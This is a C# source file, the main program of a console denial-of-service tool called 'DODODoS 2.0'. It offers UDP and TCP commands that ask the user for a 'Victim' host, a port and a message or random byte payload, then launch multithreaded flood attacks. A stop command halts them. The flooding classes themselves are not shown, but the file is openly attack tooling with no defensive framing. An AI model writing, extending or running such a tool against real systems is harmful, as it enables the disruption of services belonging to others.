using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace DODODoS
{
    class Program
    {
        static Dictionary<String, Action> cmd;
        static DODODoS.UDP UDPvictim = new DODODoS.UDP();
        static DODODoS.TCP TCPvictim = new DODODoS.TCP();
        static void Main(string[] args)
        {
            bool exit = true;
            LoadCommands();
            Help();

            while (exit)
            {
                Console.Write("> ");
                string command = Console.ReadLine().ToLower();
                if (cmd.ContainsKey(command))
                    cmd[command]();
                else
                    Console.WriteLine("Unknown command");
            }
        }
        /// <summary>
        /// Loads the various commands in the dictionary
        /// </summary>
        static void LoadCommands()
        {
            //      <USELESS CODE>
            ConsoleColor tmp = Console.ForegroundColor;
            Console.ForegroundColor = Console.BackgroundColor;
            Console.BackgroundColor = tmp;
            Console.WriteLine("Welcome to DODODoS 2.0");
            Console.BackgroundColor = Console.ForegroundColor;
            Console.ForegroundColor = tmp;
            //      </USELESS CODE>
            cmd = new Dictionary<string, Action>();
            cmd.Add("udp", new Action(UDP));
            cmd.Add("tcp", new Action(TCP));
            cmd.Add("stop", new Action(Stop));
            cmd.Add("help", new Action(Help));
            cmd.Add("exit", new Action(Exit));
        }

        static void Exit()
        {
            Environment.Exit(0);
        }
        /// <summary>
        /// Prints the list of commands
        /// </summary>
        static void Help()
        {
            Console.WriteLine("Available commands:");
            foreach (string s in cmd.Keys)
            {
                Console.WriteLine("  " + s.ToUpper());
            }
        }

        /// <summary>
        /// Starts a UDP attack
        /// </summary>
        static void UDP()
        {
            string host;
            int port;
            byte[] message;
            Collect(out host, out port, out message);
            UDPvictim = new DODODoS.UDP();
            UDPvictim.Connect(host, port);
            UDPvictim.Attack(message, Environment.ProcessorCount * 2);
        }

        /// <summary>
        /// Starts a TCP attack
        /// </summary>
        static void TCP()
        {
            string host;
            int port;
            byte[] message;
            Collect(out host, out port, out message);
            TCPvictim = new DODODoS.TCP();
            TCPvictim.Connect(host, port);
            TCPvictim.Attack(message, Environment.ProcessorCount * 2);
        }

        /// <summary>
        /// Stops all running attacks
        /// </summary>
        static void Stop()
        {
            if (UDPvictim.IsRunning)
                UDPvictim.Stop();
            if(TCPvictim.IsRunning)
                TCPvictim.Stop();
        }

        /// <summary>
        /// Collects the input from the user
        /// </summary>
        /// <param name="host">The host name or ip of the victim</param>
        /// <param name="port">The port of the victim</param>
        /// <param name="message">the message to send</param>
        static void Collect(out string host,out int port, out byte[] message)
        {
            Console.Write("Victim: ");
            host = Console.ReadLine();
            Console.Write("Port: ");
            port = Convert.ToInt32(Console.ReadLine());
            Console.Write("Random string or message? [R/M]: ");
            if (Console.ReadLine().ToLower() == "r")
            {
                Console.Write("String lenght: ");
                message = Generate(Convert.ToInt32(Console.ReadLine()));
                }
            else
            {
                Console.Write("Message: ");
                message = Encoding.ASCII.GetBytes(Console.ReadLine());
            }
        }

        static byte[] Generate(int lenght)
        {
            byte[] b = new byte[lenght];
            for (int i = 0; i < lenght; i++)
                b[i] = Convert.ToByte(new Random().Next(255));
            return b;
        }
    }
}
